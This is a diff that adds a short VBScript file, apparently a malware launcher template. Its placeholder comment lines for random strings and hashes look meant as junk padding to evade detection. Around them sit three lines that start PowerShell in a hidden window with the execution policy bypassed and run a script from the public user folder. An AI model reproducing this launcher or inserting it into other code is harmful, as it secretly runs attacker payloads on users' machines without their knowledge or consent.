@@ -1,0 +1,22 @@
+'[-randomstring-]
+   '[-randommd5-]
+  '[-randomstring-]
+'[-randommd5-]
+'[-randomstring-]
+ '[-randommd5-]
+'[-randomstring-]
+'[-randommd5-]
+Dim gdgdgdgxcx
+Set gdgdgdgxcx = Wscript.CreateObject("WScript.Shell")
+gdgdgdgxcx.Run "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -windowstyle hidden -noexit -command C:\Users\Public\Datax.ps1;",0
+
+
+
+  	'[-randomstring-]
+   '[-randommd5-]
+  '[-randomstring-]
+'[-randommd5-]
+'[-randomstring-]
+ '[-randommd5-]
+'[-randomstring-]
+'[-randommd5-]
